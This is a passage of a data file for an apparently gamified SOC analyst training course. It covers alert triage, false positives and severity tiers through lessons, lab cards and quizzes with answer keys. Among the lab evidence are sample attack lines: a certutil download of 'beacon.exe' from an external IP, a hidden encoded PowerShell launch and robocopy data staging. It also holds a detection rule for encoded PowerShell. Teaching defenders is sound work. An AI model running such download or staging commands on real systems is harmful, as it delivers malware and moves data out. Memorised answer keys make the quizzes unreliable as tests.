              { id: 'tri-4', left: 'Outbound HTTP GET request to raw external IP', right: 'Potential Command & Control (C2) beacon or stager download' },
            ],
            explanation: 'Recognizing process tree anomalies and obfuscation patterns allows analysts to validate true threats quickly.',
          },
        },
      },
      {
        id: 'topic-3-2',
        unitId: 'unit-3',
        title: 'Entity Identification & Basic Triage Lab',
        order: 2,
        estimatedMinutes: 25,
        xpReward: 60,
        theory: {
          summaryLines: [
            'Every alert investigation revolves around 4 core investigative entities: User, Host, IP, and Evidence.',
            '1. Identify User: Who was logged in? Is it an administrative service account or an end user? Is the activity normal for their job role?',
            '2. Identify Host: What machine was affected? Workstation, database server, or domain controller? What is its asset criticality tier?',
            '3. Identify IP: Source and destination IP addresses. Is the destination internal RFC-1918 or an untrusted external bulletproof host?',
            '4. Check Evidence: Validate timestamps, process hashes, and command lines against threat intelligence sources (VirusTotal, AlienVault OTX).',
            'Once all 4 entities are identified and cross-checked, the analyst delivers the triage verdict: True Positive (Escalate) or False Positive (Close).',
          ],
          knowMore: {
            title: 'MITRE D3FEND: Model for Defensive Cyber Operations',
            description: 'Learn how identifying digital artifacts supports precise defensive countermeasures.',
            externalUrl: 'https://d3fend.mitre.org/',
            externalLabel: 'Browse MITRE D3FEND Framework',
          },
        },
        demo: {
          title: 'The 4-Pillar Entity Extraction',
          subtitle: 'Isolating User, Host, IP, and Evidence from raw SIEM JSON logs.',
          steps: [
            {
              stepNumber: 1,
              title: 'Entity Mapping in Raw Logs',
              description: 'The analyst pulls the raw JSON log and extracts `user.name: jdoe-finance`, `host.name: WKSTN-FIN-042`, and `destination.ip: 185.220.101.5`.',
              visualType: 'terminal',
              highlightElements: ['user-field', 'host-field', 'ip-field'],
              narration: 'Entity mapping turns confusing JSON syntax into a clear human story.',
            },
            {
              stepNumber: 2,
              title: 'The Triage Decision',
              description: 'With user context, high asset risk, and malicious external C2 IP verified, the alert is declared a True Positive.',
              visualType: 'dashboard',
              highlightElements: ['verdict-true-positive', 'escalate-button'],
              narration: 'The analyst escalates to Tier 2 with clear entity documentation.',
            },
          ],
        },
        interactive: {
          title: 'Hands-On Lab: Basic Alert Triage',
          scenario: 'A high-priority SIEM alert has fired. Inspect the raw log, extract the 4 critical entities, and deliver your triage verdict.',
          cards: [
            {
              id: 'card-lab-log',
              title: 'Raw SIEM Log Record [Alert #ALT-4491]',
              source: 'CrowdStrike / Sysmon Event ID 1',
              timestamp: '14:28:19 UTC',
              category: 'host',
              summary: '`powershell.exe -NoP -NonI -W Hidden -Enc SUVY...` executed on host `WKSTN-FIN-042` by `CORP\\jdoe-finance`. Outbound socket to `185.220.101.5:443`.',
              details: [
                { label: 'User Account', value: 'jdoe-finance (Finance Specialist)' },
                { label: 'Workstation', value: 'WKSTN-FIN-042 (Windows 11 Pro)' },
                { label: 'Destination IP', value: '185.220.101.5 (Known C2 Infrastructure)' },
                { label: 'Parent Process', value: 'excel.exe (PID 4812)' },
              ],
              isSuspicious: true,
              relevanceScore: 100,
              tags: ['Lab-Evidence', 'Entity-Extraction', 'Triage'],
            },
          ],
        },
        socContext: {
          title: 'The Impact of Missing Entity Context',
          scenario: 'An analyst documented an alert as "malware found on a computer" without noting the hostname or user account.',
          analystMindset: 'Without the hostname or IP, the incident response team could not locate or isolate the machine, giving the attacker 6 additional hours inside the network.',
          bestPractices: [
            'Always capture both NetBIOS hostname and internal IP address, as DHCP addresses change over time.',
            'Cross-reference the user account against HR directory records to verify department and normal activity patterns.',
            'Defang all malicious indicators (`hxxp://`, `192[.]168...`) to prevent accidental clicks.',
          ],
        },
        knowledgeCheck: {
          dragDrop: {
            title: 'Map Entities to their Investigative Value',
            instructions: 'Match each entity with the primary question it answers during triage.',
            items: [
              { id: 'ent-1', label: 'User Account (e.g. jdoe-finance)', category: 'Answers: WHO' },
              { id: 'ent-2', label: 'Hostname & Internal IP (e.g. WKSTN-FIN-042)', category: 'Answers: WHERE' },
              { id: 'ent-3', label: 'Remote IP & Domain (e.g. 185.220.101.5)', category: 'Answers: WHENCE / C2' },
              { id: 'ent-4', label: 'Command-Line Payload & File Hash', category: 'Answers: WHAT HAPPENED' },
            ],
            explanation: 'The four entities (User, Host, IP, Evidence) form the foundation of every professional investigation report.',
          },
        },
      },
    ],
    assessment: {
      id: 'unit-3-assessment',
      title: 'Unit 3 Assessment: Alert Triage',
      passingScore: 80,
      xpReward: 150,
      questions: [
        {
          id: 'u3-q1',
          question: 'What are the four essential entities an analyst must extract during alert triage?',
          options: [
            'Monitor serial number, keyboard layout, mouse speed, desk location',
            'User account, Hostname/Asset, Source/Destination IP, and Raw Evidence/Command',
            'Company revenue, stock price, CEO name, coffee brand',
            'Operating system wallpaper, sound volume, screen brightness, battery percentage',
          ],
          correctAnswer: 1,
          explanation: 'User, Host, IP, and Evidence are the four pillars needed to identify, contain, and scope an intrusion.',
        },
        {
          id: 'u3-q2',
          question: 'Why do attackers frequently execute commands with `-enc` (Base64 encoding) in PowerShell?',
          options: [
            'It makes the command run 10 times faster',
            'It obscures the malicious script from casual human reading and simple signature scanners',
            'It prevents the computer from using battery power',
            'It is required by Microsoft for all Windows scripts',
          ],
          correctAnswer: 1,
          explanation: 'Base64 obfuscation masks command strings (like `Invoke-WebRequest` or `DownloadString`) from simple string-matching rules.',
        },
        {
          id: 'u3-q3',
          question: 'If `excel.exe` spawns `cmd.exe` or `powershell.exe`, what is the most likely explanation?',
          options: [
            'Microsoft Excel is performing a routine spreadsheet auto-save',
            'A malicious macro or exploit embedded in the document is executing a living-off-the-land stager',
            'The computer monitor needs to be calibrated',
            'The user opened a formula with more than 10 rows',
          ],
          correctAnswer: 1,
          explanation: 'Productivity applications like Word and Excel should never spawn interactive command shells in normal business workflows.',
        },
        {
          id: 'u3-q4',
          question: 'Why must both the hostname and internal IP address be documented during triage?',
          options: [
            'Because DHCP addresses change dynamically, but hostnames remain constant across lease renewals',
            'Because hostnames cannot be written in English',
            'Because IP addresses are only used for gaming',
            'Because the SIEM crashes if one is left empty',
          ],
          correctAnswer: 0,
          explanation: 'IP leases shift frequently in dynamic corporate DHCP environments; pairing hostname and IP ensures forensic accuracy.',
        },
        {
          id: 'u3-q5',
          question: 'What is the appropriate action when an analyst confirms that an alert represents a true active compromise?',
          options: [
            'Close the alert as resolved to keep the queue clean',
            'Classify as True Positive, preserve evidence, initiate host containment, and escalate per playbook',
            'Reboot the computer and hope the malware disappears',
            'Send an email to all company staff warning them not to turn on their laptops',
          ],
          correctAnswer: 1,
          explanation: 'A confirmed True Positive requires immediate escalation, evidence preservation, and containment actions according to the playbook.',
        },
      ],
    },
  },

  // =========================================================================
  // UNIT 4: FALSE POSITIVES
  // =========================================================================
  {
    id: 'unit-4',
    unitNumber: 4,
    title: 'Unit 4: False Positives',
    description: 'Learn to distinguish between malicious True Positives, Expected Activity, Benign True Positives, and Detection Errors, and conduct rule tuning.',
    estimatedHours: 2,
    topics: [
      {
        id: 'topic-4-1',
        unitId: 'unit-4',
        title: 'Expected Activity & Benign True Positives',
        order: 1,
        estimatedMinutes: 20,
        xpReward: 50,
        theory: {
          summaryLines: [
            'A False Positive (FP) occurs when a security tool triggers an alert on harmless, legitimate activity.',
            'Category 1: Expected Activity. Routine IT operations (e.g. weekly vulnerability scans by Nessus, scheduled backups by Robocopy, SCCM software deployments) that match attack signatures.',
            'Category 2: Benign True Positive (BTP). The alert fired correctly because the rule condition was met (e.g., an admin opened a PowerShell remote session), but investigation proves the intent was authorized and harmless.',
            'Distinguishing between true threats and benign noise requires investigating: Who ran it? When? Under what change ticket? Did it behave maliciously?',
            'Closing a False Positive requires documenting the exact evidence why the activity was safe.',
          ],
          knowMore: {
            title: 'NIST Guide to Intrusion Detection Tuning',
            description: 'Best practices for reducing false-alarm rates while maintaining high detection sensitivity.',
            externalUrl: 'https://csrc.nist.gov/',
            externalLabel: 'Read NIST Detection Guidelines',
          },
        },
        demo: {
          title: 'Expected Activity vs Malicious Intrusion',
          subtitle: 'Comparing two identical PowerShell executions to uncover the difference between routine IT work and adversary intrusion.',
          steps: [
            {
              stepNumber: 1,
              title: 'Scenario A: IT Admin Backup Script',
              description: 'Execution: `robocopy.exe C:\\Data \\\\BackupServer\\Share` at 02:00 AM by service account `svc-backup` linked to approved change request CR-9912.',
              visualType: 'terminal',
              highlightElements: ['svc-backup', 'approved-change'],
              narration: 'Authorized, expected system maintenance activity. Classified as Benign Expected Activity.',
            },
            {
              stepNumber: 2,
              title: 'Scenario B: Adversary Data Staging',
              description: 'Execution: `robocopy.exe C:\\Users \\\\EvilBox\\Share` at 02:15 AM by compromised account `jdoe-intern` to an external host.',
              visualType: 'terminal',
              highlightElements: ['compromised-user', 'evil-destination'],
              narration: 'Unauthorized exfiltration staging using identical binary. Classified as True Positive Malicious Incident.',
            },
          ],
        },
        interactive: {
          title: 'Benign vs. Malicious Activity Comparator',
          scenario: 'Analyze 3 operational scenarios and determine which represents Expected Benign Activity vs. True Malicious Intrusion.',
          cards: [
            {
              id: 'card-fp1',
              title: 'Vulnerability Scanner Activity',
              source: 'Internal Network IDS',
              timestamp: '03:00:15 UTC',
              category: 'network',
              summary: 'Mass SYN sweep on port 445 originated from IP `10.0.100.50` (Approved Tenable Nessus Scanner).',
              details: [
                { label: 'Authorized Scanner', value: 'Yes - Registered in Asset Inventory' },
                { label: 'Change Window', value: 'Window CHG-440 (Weekly Security Scan)' },
                { label: 'Verdict', value: 'Expected Activity (False Positive)' },
              ],
              isSuspicious: false,
              relevanceScore: 15,
              tags: ['Expected', 'Scanner', 'FP'],
            },
            {
              id: 'card-fp2',
              title: 'Developer Node.js Localhost Binding',
              source: 'Engineering Workstation',
              timestamp: '15:10:00 UTC',
              category: 'host',
              summary: 'Alert: "Suspicious Listening Port Opened". Software engineer running `npm run dev` binding to `127.0.0.1:3000`.',
              details: [
                { label: 'User Role', value: 'Frontend Developer' },
                { label: 'Binding Scope', value: 'Localhost Loopback Only' },
                { label: 'Verdict', value: 'Benign True Positive (Safe Dev Activity)' },
              ],
              isSuspicious: false,
              relevanceScore: 20,
              tags: ['Benign', 'Developer', 'Loopback'],
            },
            {
              id: 'card-fp3',
              title: 'External Remote Access Tool Installed',
              source: 'Receptionist Workstation',
              timestamp: '16:45:22 UTC',
              category: 'host',
              summary: 'Alert: "AnyDesk / TeamViewer Installed". User received a cold phone call from "Helpdesk" claiming a virus infection.',
              details: [
                { label: 'Corporate Policy', value: 'Unauthorized Remote Tools Prohibited' },
                { label: 'Threat Actor', value: 'Social Engineering / Tech Support Scam' },
                { label: 'Verdict', value: 'True Positive Malicious Intrusion' },
              ],
              isSuspicious: true,
              relevanceScore: 95,
              tags: ['True-Positive', 'Scam', 'Remote-Access'],
            },
          ],
        },
        socContext: {
          title: 'The "Close and Forget" Trap',
          scenario: 'An analyst closed an alert as a False Positive because the username was "Administrator", without checking if the administrator was actually working at that hour.',
          analystMindset: 'Attackers love compromising administrative accounts because analysts often dismiss administrative activity as routine. Always verify authorized intent.',
          bestPractices: [
            'Cross-check high-privilege executions against active Change Management tickets before closing.',
            'When in doubt, contact the user via an out-of-band channel (e.g. phone or Slack) to confirm they initiated the action.',
            'Never close an alert as a False Positive without documenting the verification evidence in the ticket.',
          ],
        },
        knowledgeCheck: {
          matching: {
            title: 'Match Triage Outcome to Operational Definition',
            instructions: 'Pair each classification with its real-world SOC meaning.',
            pairs: [
              { id: 'fp-1', left: 'True Positive (TP)', right: 'Alert triggered on genuine malicious activity; requires containment' },
              { id: 'fp-2', left: 'False Positive (FP)', right: 'Alert triggered on benign activity; rule needs refinement or allowlist' },
              { id: 'fp-3', left: 'Benign True Positive (BTP)', right: 'Rule fired correctly, but activity was verified as authorized business action' },
              { id: 'fp-4', left: 'False Negative (FN)', right: 'Malicious attack bypassed detection; no alert fired (the most dangerous outcome)' },
            ],
            explanation: 'Mastering these 4 definitions ensures accurate metrics and effective detection rule tuning.',
          },
        },
      },
      {
        id: 'topic-4-2',
        unitId: 'unit-4',
        title: 'Detection Errors & FP Identification Lab',
        order: 2,
        estimatedMinutes: 25,
        xpReward: 60,
        theory: {
          summaryLines: [
            'Detection Errors occur when a rule is poorly written or overly broad.',
            'Examples of Detection Errors: A rule alerting on any process named `calc.exe`, or matching greedy regex patterns that catch legitimate paths.',
            'Rule Tuning: The engineering process of refining alert logic to exclude verified benign patterns without creating blind spots.',
            'Tuning Methods: Adding specific exclusions (e.g., exclude service account `svc-backup` only when running `robocopy.exe` from `C:\\Scripts\\Backup.ps1`).',
            'Rule Retirement: If a rule cannot be tuned and produces over 95% noise, it must be disabled or rewritten.',
          ],
          knowMore: {
            title: 'Sigma HQ: Generic Signature Format for SIEM Systems',
            description: 'Learn how to write precise, robust detection rules that minimize false positives.',
            externalUrl: 'https://github.com/SigmaHQ/sigma',
            externalLabel: 'Browse Sigma Rule Repository',
          },
        },
        demo: {
          title: 'Tuning a Greedy Detection Rule',
          subtitle: 'Refining an alert from 500 noisy alerts per day down to zero false alarms.',
          steps: [
            {
              stepNumber: 1,
              title: 'The Flawed Rule',
              description: 'Rule logic: `process.name == powershell.exe`. Fired 800 times a day because Windows OS uses PowerShell for routine diagnostics.',
              visualType: 'terminal',
              highlightElements: ['broad-rule', 'high-noise'],
              narration: 'A greedy rule that alerts on common administrative utilities is useless.',
            },
            {
              stepNumber: 2,
              title: 'The Tuned Rule',
              description: 'New logic: `process.name == powershell.exe AND process.command_line contains "-enc" AND parent_process.name in ["winword.exe", "excel.exe"]`.',
              visualType: 'terminal',
              highlightElements: ['precise-rule', 'zero-noise'],
              narration: 'The tuned rule catches genuine attacks while ignoring routine administration.',
            },
          ],
        },
        interactive: {
          title: 'Hands-On Lab: False-Positive Identification',
          scenario: 'Review 3 live queue cases. Evaluate the evidence, identify which are False Positives vs True Positives, and recommend rule tuning.',
          cards: [
            {
              id: 'card-lab-fp1',
              title: 'Case 1: Nightly Robocopy on Database Server',
              source: 'Host Event Logs',
              timestamp: '02:00:00 UTC',
              category: 'host',
              summary: '`robocopy.exe E:\\Backups \\\\Nas01\\DBBackups` run by `svc-sql-backup`. Matches approved weekly schedule.',
              details: [
                { label: 'Classification', value: 'Expected Activity (False Positive)' },
                { label: 'Tuning Fix', value: 'Allowlist `svc-sql-backup` executing `robocopy.exe` with destination `\\\\Nas01\\DBBackups`' },
              ],
              isSuspicious: false,
              relevanceScore: 10,
              tags: ['Lab-FP', 'Tuning', 'Expected'],
            },
            {
              id: 'card-lab-fp2',
              title: 'Case 2: Inbound Firewall SYN to Closed Port 23',
              source: 'Perimeter Firewall Log',
              timestamp: '02:14:10 UTC',
              category: 'network',
              summary: 'Inbound packet dropped on port 23 (Telnet). Perimeter firewall dropped packet; zero internal hosts responded.',
              details: [
                { label: 'Classification', value: 'Benign Internet Noise / Detection Error' },
                { label: 'Tuning Fix', value: 'Only alert on accepted inbound connections, not dropped edge scans' },
              ],
              isSuspicious: false,
              relevanceScore: 15,
              tags: ['Lab-FP', 'Dropped-Scan', 'Noise'],
            },
            {
              id: 'card-lab-fp3',
              title: 'Case 3: Certutil.exe Downloading External .EXE',
              source: 'HR Laptop Endpoint Telemetry',
              timestamp: '02:30:15 UTC',
              category: 'host',
              summary: '`certutil.exe -urlcache -split -f http://45.142.122.9/beacon.exe %TEMP%\\svchost.exe`.',
              details: [
                { label: 'Classification', value: 'True Positive (Malicious Living-off-the-Land Attack)' },
                { label: 'Action', value: 'Immediate host isolation and P1 incident escalation' },
              ],
              isSuspicious: true,
              relevanceScore: 100,
              tags: ['Lab-TP', 'Living-off-the-Land', 'Malicious'],
            },
          ],
        },
        socContext: {
          title: 'The Danger of Over-Tuning',
          scenario: 'An engineer created an allowlist rule: "Ignore any command run by user `john.smith`". Two months later, John\'s account was compromised and ransomed the network completely unmonitored.',
          analystMindset: 'Never allowlist an entire user or an entire directory. Always tie tuning exclusions to specific binary paths, exact hashes, and parent processes.',
          bestPractices: [
            'Tune rules based on specific command parameters and parent processes, never broad usernames.',
            'Review all allowlist rules quarterly to ensure obsolete exceptions are removed.',
            'Document the exact business justification for every detection exclusion.',
          ],
        },
        knowledgeCheck: {
          dragDrop: {
            title: 'Classify the Case Studies',
            instructions: 'Sort each case into its correct triage verdict.',
            items: [
              { id: 'cd-1', label: 'Approved scheduled backup script run by service account', category: 'False Positive (Expected)' },
              { id: 'cd-2', label: 'Perimeter firewall drops random port scan from internet', category: 'False Positive (Noise)' },
              { id: 'cd-3', label: 'Office macro launches CertUtil downloading executable', category: 'True Positive (Malicious)' },
              { id: 'cd-4', label: 'Developer tests web server locally on 127.0.0.1:8080', category: 'False Positive (Benign TP)' },
            ],
            explanation: 'Recognizing legitimate IT operations prevents wasted time and allows focus on genuine threats.',
          },
        },
      },
    ],
    assessment: {
      id: 'unit-4-assessment',
      title: 'Unit 4 Assessment: False Positives',
      passingScore: 80,
      xpReward: 150,
      questions: [
        {
          id: 'u4-q1',
          question: 'What defines a False Positive in a security monitoring context?',
          options: [
            'An attack that encrypted all servers without triggering an alert',
            'An alert triggered on legitimate, authorized, or harmless system activity',
            'An alert written in another programming language',
            'A computer that has lost network connectivity',
          ],
          correctAnswer: 1,
          explanation: 'False Positives occur when legitimate business operations match overly broad detection rules.',
        },
        {
          id: 'u4-q2',
          question: 'What is a "Benign True Positive" (BTP)?',
          options: [
            'An alert rule that was completely broken and produced no output',
            'The rule triggered correctly because the condition occurred, but investigation confirmed the action was authorized and safe',
            'A virus that helps speed up computer performance',
            'An alert that fired on an employee playing video games',
          ],
          correctAnswer: 1,
          explanation: 'In a BTP, the behavior occurred as defined (e.g. an admin ran PowerShell remoting), but it was authorized IT work.',
        },
        {
          id: 'u4-q3',
          question: 'What is the primary danger of broad, sloppy rule tuning (e.g., allowlisting an entire user account)?',
          options: [
            'It creates dangerous blind spots that adversaries can exploit if that account is compromised',
            'It slows down internet connection speeds for the entire company',
            'It deletes the user Windows profile',
            'It uses up too many IP addresses',
          ],
          correctAnswer: 0,
          explanation: 'Overly broad allowlists blind the SOC to attacks originating from compromised legitimate credentials.',
        },
        {
          id: 'u4-q4',
          question: 'An edge firewall drops 10,000 automated port scan packets from random internet IPs daily. Why should this NOT trigger an analyst alert?',
          options: [
            'Because firewalls are not part of the security architecture',
            'Because the packets were blocked at the perimeter and represent background internet noise with zero internal impact',
            'Because internet users have a legal right to scan corporate networks',
            'Because the SIEM cannot process firewall logs',
          ],
          correctAnswer: 1,
          explanation: 'Alerting on blocked external scans floods analysts with noise; alerts should focus on accepted connections or internal propagation.',
        },
        {
          id: 'u4-q5',
          question: 'How should an analyst document the closure of an alert verified as a False Positive?',
          options: [
            'Leave the ticket blank and click close',
            'Document the evidence verified, the legitimate business reason, and a recommendation for rule tuning',
            'Blame the software vendor in the public notes',
            'Delete the raw log files so they do not show up in searches',
          ],
          correctAnswer: 1,
          explanation: 'Detailed FP documentation justifies closure and provides detection engineers the exact data needed to tune the rule.',
        },
      ],
    },
  },

  // =========================================================================
  // UNIT 5: SEVERITY
  // =========================================================================
  {
    id: 'unit-5',
    unitNumber: 5,
    title: 'Unit 5: Severity',
    description: 'Master severity tiering (Low, Medium, High, Critical), understand the mathematics of Impact vs. Confidence, and classify live incidents.',
    estimatedHours: 2,
    topics: [
      {
        id: 'topic-5-1',
        unitId: 'unit-5',
        title: 'Severity Tiers: Low, Medium, High & Critical',
        order: 1,
        estimatedMinutes: 20,
        xpReward: 50,
        theory: {
          summaryLines: [
            'Severity determines how urgently an incident must be addressed and allocates the organization\'s defensive resources.',
            'Critical (P1): Active catastrophe. Crown jewels compromised (Domain Controllers, customer databases, active ransomware). SLA: Immediate response (< 15 mins).',
            'High (P2): Severe compromise with containment intact. Malware running on executive laptop, unauthorized privilege escalation. SLA: < 1 hour.',
            'Medium (P3): Suspicious policy violation or contained threat. Phishing email delivered with malicious link not clicked, adware on standard workstation. SLA: < 4 hours.',
            'Low (P4): Minor informational anomaly. Inbound port scans blocked by firewall, routine password resets, policy warnings. SLA: < 24-48 hours.',
            'Misclassifying severity leads to burnout on trivial alerts or disastrous delays on critical breaches.',
          ],
          knowMore: {
            title: 'FIRST Common Vulnerability Scoring System (CVSS)',
            description: 'Learn the international industry standard for assessing the severity of computer system vulnerabilities.',
            externalUrl: 'https://www.first.org/cvss/',
            externalLabel: 'Explore CVSS Metrics',
          },
        },
        demo: {
          title: 'The Severity Matrix & SLA Countdown',
          subtitle: 'Visualizing response times and escalation thresholds across P1 through P4 tiers.',
          steps: [
            {
              stepNumber: 1,
              title: 'P1: The Active Ransomware Crisis',
              description: 'Alert: Active mass file encryption detected on primary ERP storage cluster. 15-minute SLA clock initiates war room assembly.',
              visualType: 'dashboard',
              highlightElements: ['p1-critical', 'sla-15min', 'war-room'],
              narration: 'Critical incidents demand all-hands emergency response and executive notification.',
            },
            {
              stepNumber: 2,
              title: 'P3: The Contained Phishing Lure',
              description: 'Alert: Credential harvesting email received by 3 employees; email gateway quarantined the message before opening.',
              visualType: 'dashboard',
              highlightElements: ['p3-medium', 'sla-4hr'],
              narration: 'Contained events follow standard operational queues without emergency disruption.',
            },
          ],
        },
        interactive: {
          title: 'Severity Tier Matrix Explorer',
          scenario: 'Explore the 4 standard priority tiers, their SLA countdowns, and the required operational response protocols.',
          cards: [
            {
              id: 'card-sev1',
              title: 'P1 - Critical Severity',
              source: 'Emergency Response SLA',
              timestamp: '< 15 Mins Response',
              category: 'host',
              summary: 'Domain controller compromise, root-level cloud breach, active ransomware encryption across network.',
              details: [
                { label: 'Required Action', value: 'Assemble incident war room, notify CISO, invoke emergency isolation' },
                { label: 'SLA Window', value: 'Immediate response within 15 minutes' },
              ],
              isSuspicious: true,
              relevanceScore: 100,
              tags: ['P1', 'Critical', 'Emergency'],
            },
            {
              id: 'card-sev2',
              title: 'P2 - High Severity',
              source: 'Urgent Incident SLA',
              timestamp: '< 1 Hour Response',
              category: 'user',
              summary: 'Malware active in RAM on single workstation, unauthorized administrative account created, active C2 beaconing.',
              details: [
                { label: 'Required Action', value: 'Isolate affected host, dump volatile memory, revoke compromised credentials' },
                { label: 'SLA Window', value: 'Containment within 60 minutes' },
              ],
              isSuspicious: true,
              relevanceScore: 85,
              tags: ['P2', 'High', 'Urgent'],
            },
            {
              id: 'card-sev3',
              title: 'P3 - Medium Severity',
              source: 'Standard Operational SLA',
              timestamp: '< 4 Hours Response',
              category: 'network',
              summary: 'Quarantined phishing attachments, suspicious login from unusual country blocked by MFA, adware installation.',
              details: [
                { label: 'Required Action', value: 'Investigate potential user interaction, purge malicious emails from mailboxes' },
                { label: 'SLA Window', value: 'Triage within 4 business hours' },
              ],
              isSuspicious: false,
              relevanceScore: 50,
              tags: ['P3', 'Medium', 'Standard'],
            },
            {
              id: 'card-sev4',
              title: 'P4 - Low Severity',
              source: 'Informational SLA',
              timestamp: '< 24 Hours Response',
              category: 'host',
              summary: 'Blocked inbound perimeter port scans, routine policy warnings, software version deprecation notice.',
              details: [
                { label: 'Required Action', value: 'Batch review during regular shift hours, aggregate for trend metrics' },
                { label: 'SLA Window', value: 'Review within 24 to 48 hours' },
              ],
              isSuspicious: false,
              relevanceScore: 20,
              tags: ['P4', 'Low', 'Informational'],
            },
          ],
        },
        socContext: {
          title: 'The "Everything is Critical" Trap',
          scenario: 'A SOC categorized all 300 daily alerts as "Critical", resulting in analysts ignoring alarms and missing an actual domain takeover.',
          analystMindset: 'If everything is high priority, nothing is high priority. Reserve P1 strictly for true existential threats to business operations.',
          bestPractices: [
            'Maintain strict criteria for P1 declaration; only Tier 2 leads or SOC managers should approve P1 escalations.',
            'Automate initial containment for P1 threats (e.g. automatic network quarantine via EDR).',
            'Track SLA breach rates weekly to identify operational bottlenecks.',
          ],
        },
        knowledgeCheck: {
          matching: {
            title: 'Match Scenario to Correct Severity Tier',
            instructions: 'Pair each incident scenario with its appropriate severity classification.',
            pairs: [
              { id: 'sev-1', left: 'Active ransomware encrypting the enterprise database server', right: 'Critical (P1)' },
              { id: 'sev-2', left: 'Executive laptop executing Mimikatz credential dumper', right: 'High (P2)' },
              { id: 'sev-3', left: 'Malicious email attachment quarantined by gateway before delivery', right: 'Medium (P3)' },
              { id: 'sev-4', left: 'External internet scanner probing closed firewall port 80', right: 'Low (P4)' },
            ],
            explanation: 'Severity correlates directly with potential business damage and attack progression stage.',
          },
        },
      },
      {
        id: 'topic-5-2',
        unitId: 'unit-5',
        title: 'Impact, Confidence & Severity Classification Lab',
        order: 2,
        estimatedMinutes: 25,
        xpReward: 60,
        theory: {
          summaryLines: [
            'Severity is not a subjective guess; it is calculated using two primary variables: Impact and Confidence.',
            'Impact = Asset Criticality (Crown Jewel vs Test VM) + Business Disruption Potential + Data Sensitivity (PCI/HIPAA/PII).',
            'Confidence = Detection Fidelity (Single heuristic vs Multiple corroborating logs) + Threat Intelligence validation.',
            'The Severity Formula: High Impact + High Confidence = Critical (P1). High Impact + Low Confidence = Medium/High (Investigate urgently).',
            'Low Impact + Low Confidence = Low (P4). Analysts use this formula to categorize alerts objectively.',
          ],
          knowMore: {
            title: 'NIST Risk Management Framework (RMF)',
            description: 'Explore how organizations systematically categorize assets, evaluate impact, and manage cyber risks.',
            externalUrl: 'https://csrc.nist.gov/projects/risk-management/about-rmf',
            externalLabel: 'Explore NIST RMF Overview',
          },
        },
        demo: {
          title: 'The Impact × Confidence Calculator',
          subtitle: 'Interactive calculation of incident risk based on asset value and detection reliability.',
          steps: [
            {
              stepNumber: 1,
              title: 'Evaluating Asset Criticality',
              description: 'Is the target a test VM in an isolated sandbox or the Active Directory Domain Controller for 20,000 employees?',
              visualType: 'dashboard',
              highlightElements: ['asset-value', 'business-impact'],
              narration: 'Asset value dramatically shifts the impact score.',
            },
            {
              stepNumber: 2,
              title: 'Evaluating Detection Confidence',
              description: 'Did the alert trigger on an unverified anomaly, or does EDR report a confirmed SHA256 hash matching known Lazarus ransomware?',
              visualType: 'terminal',
              highlightElements: ['detection-confidence', 'threat-intel-match'],
              narration: 'Corroborating indicators push confidence to 100%, producing an objective P1 severity rating.',
            },
          ],
        },
        interactive: {
          title: 'Hands-On Lab: Severity Classification',
          scenario: 'Evaluate 3 challenging incident tickets. Weigh the Impact and Confidence factors and classify each into its correct severity tier.',
          cards: [
            {
              id: 'card-lab-sev1',
              title: 'Incident A: Staging Lab VM Mining Monero',
              source: 'Cloud Telemetry',
              timestamp: '08:30:00 UTC',
              category: 'host',
              summary: 'XMRig crypto-miner found running on disposable QA testing instance. Zero production data present; host completely isolated from corporate subnet.',
              details: [
                { label: 'Impact Factor', value: 'Low (Disposable test VM, zero sensitive data)' },
                { label: 'Confidence Factor', value: 'High (Confirmed miner binary)' },
                { label: 'Correct Tier', value: 'Medium (P3) / Low (P4)' },
              ],
              isSuspicious: true,
              relevanceScore: 60,
              tags: ['Lab-Severity', 'Crypto-Miner', 'P3'],
            },
            {
              id: 'card-lab-sev2',
              title: 'Incident B: Unverified Beacon from CFO Workstation',
              source: 'Network Flow Anomaly',
              timestamp: '08:45:12 UTC',
              category: 'network',
              summary: 'Heuristic anomaly detection flagged periodic 5-minute beaconing from Chief Financial Officer laptop to newly registered overseas IP.',
              details: [
                { label: 'Impact Factor', value: 'Critical (Crown jewel user with banking credentials)' },
                { label: 'Confidence Factor', value: 'Medium (Heuristic anomaly requiring confirmation)' },
                { label: 'Correct Tier', value: 'High (P2) - Urgent investigation required' },
              ],
              isSuspicious: true,
              relevanceScore: 92,
              tags: ['Lab-Severity', 'Executive-Target', 'P2'],
            },
            {
              id: 'card-lab-sev3',
              title: 'Incident C: Active Ransomware on Core ERP Database',
              source: 'EDR Alert + File Integrity Monitor',
              timestamp: '09:00:00 UTC',
              category: 'host',
              summary: 'Volume shadow copies deleted; 50,000 `.locked` files created on primary manufacturing database server in under 3 minutes.',
              details: [
                { label: 'Impact Factor', value: 'Catastrophic (Entire company operations halted)' },
                { label: 'Confidence Factor', value: '100% (Confirmed active destruction)' },
                { label: 'Correct Tier', value: 'Critical (P1) - Immediate War Room' },
              ],
              isSuspicious: true,
              relevanceScore: 100,
              tags: ['Lab-Severity', 'Ransomware', 'P1'],
            },
          ],
        },
        socContext: {
          title: 'Asset Inventory is Everything',
          scenario: 'An alert fired on an IP address `10.5.20.12`. Without an updated CMDB (Configuration Management Database), the analyst assumed it was an office printer. It was the SWIFT wire-transfer server.',
          analystMindset: 'You cannot calculate severity without knowing what the asset does. Always verify asset classification in the CMDB.',
          bestPractices: [
            'Integrate the enterprise CMDB directly into SIEM alert views so asset criticality displays automatically.',
            'Upgrade severity immediately if regulated data (credit cards, medical records) is exposed.',
            'Document both Impact and Confidence ratings explicitly in the incident record.',
          ],
        },
        knowledgeCheck: {
          dragDrop: {
            title: 'Order Incidents by Urgency (Highest to Lowest)',
            instructions: 'Rank the incidents in order of priority from most critical to least critical.',
            items: [
              { id: 'urg-1', label: '1. Ransomware deleting shadow copies on Core ERP Server', category: 'Priority 1 (Critical)' },
              { id: 'urg-2', label: '2. Suspicious beaconing from CFO laptop to overseas IP', category: 'Priority 2 (High)' },
              { id: 'urg-3', label: '3. Crypto-miner running on disposable testing VM', category: 'Priority 3 (Medium)' },
              { id: 'urg-4', label: '4. Blocked external port scan hitting perimeter firewall', category: 'Priority 4 (Low)' },
            ],
            explanation: 'Prioritization aligns defensive resources with existential business risk.',
          },
        },
      },
    ],
    assessment: {
      id: 'unit-5-assessment',
      title: 'Unit 5 Assessment: Severity',
      passingScore: 80,
      xpReward: 150,
      questions: [
        {
          id: 'u5-q1',
          question: 'What two fundamental factors determine an incident\'s severity classification?',
          options: [
            'Monitor resolution and ambient room temperature',
            'Business Impact (asset value, data sensitivity) and Detection Confidence',
            'The number of characters in the analyst\'s password',
            'How many days remain until the weekend',
          ],
          correctAnswer: 1,
